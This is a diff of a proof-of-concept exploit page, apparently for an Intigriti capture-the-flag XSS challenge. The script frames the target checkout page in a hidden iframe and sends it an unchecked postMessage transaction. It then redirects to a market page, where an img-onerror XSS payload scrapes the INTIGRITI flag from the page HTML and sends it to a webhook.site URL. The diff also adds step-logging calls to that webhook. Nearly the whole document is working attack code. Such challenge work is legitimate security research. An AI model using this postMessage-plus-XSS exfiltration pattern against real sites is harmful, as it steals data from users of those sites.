@@ -4,27 +4,23 @@
 const BASE = 'https://challenge-0126.intigriti.io';
 const WEBHOOK = 'https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d';
 
-// Track admin visit
-fetch(`${WEBHOOK}/?step=admin_visited_poc`);
+// Track steps
+fetch(`${WEBHOOK}/?step=1_admin_visited`);
 
-// XSS payload with alert + flag exfiltration
-const xss = `<img src=x onerror="
-  alert('gigawatz');
-  fetch('${WEBHOOK}/?xss_triggered=true');
-  const html = document.body.innerHTML;
-  const flag = html.match(/INTIGRITI{[^}]+}/);
-  if (flag) fetch('${WEBHOOK}/?flag='+encodeURIComponent(flag[0]));
-">`;
+// XSS payload
+const xss = `<img src=x onerror="alert('gigawatz');fetch('${WEBHOOK}/?xss=1');const f=document.body.innerHTML;const m=f.match(/INTIGRITI{[^}]+}/);if(m)fetch('${WEBHOOK}/?flag='+encodeURIComponent(m[0]))">`;
 
-// Create iframe to checkout page
+// Create iframe
 const iframe = document.createElement('iframe');
 iframe.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
 iframe.style.display = 'none';
 document.body.appendChild(iframe);
 
 iframe.onload = () => {
+  fetch(`${WEBHOOK}/?step=2_checkout_loaded`);
+
   setTimeout(() => {
-    // Send malicious postMessage (no origin validation!)
+    // Send postMessage
     iframe.contentWindow.postMessage({
       type: 'submitTransaction',
       transaction: {
@@ -35,11 +31,18 @@ iframe.onload = () => {
       }
     }, '*');
 
-    // Navigate to marketwatch where XSS triggers
+    fetch(`${WEBHOOK}/?step=3_postmessage_sent`);
+
+    // Wait longer for transaction to process, then redirect
     setTimeout(() => {
+      fetch(`${WEBHOOK}/?step=4_redirecting_to_marketwatch`);
       window.location = `${BASE}/marketwatch.html`;
-    }, 2000);
-  }, 2000);
+    }, 5000);
+  }, 3000);
+};
+
+iframe.onerror = () => {
+  fetch(`${WEBHOOK}/?step=error_iframe_failed`);
 };
 </script>
 </body>
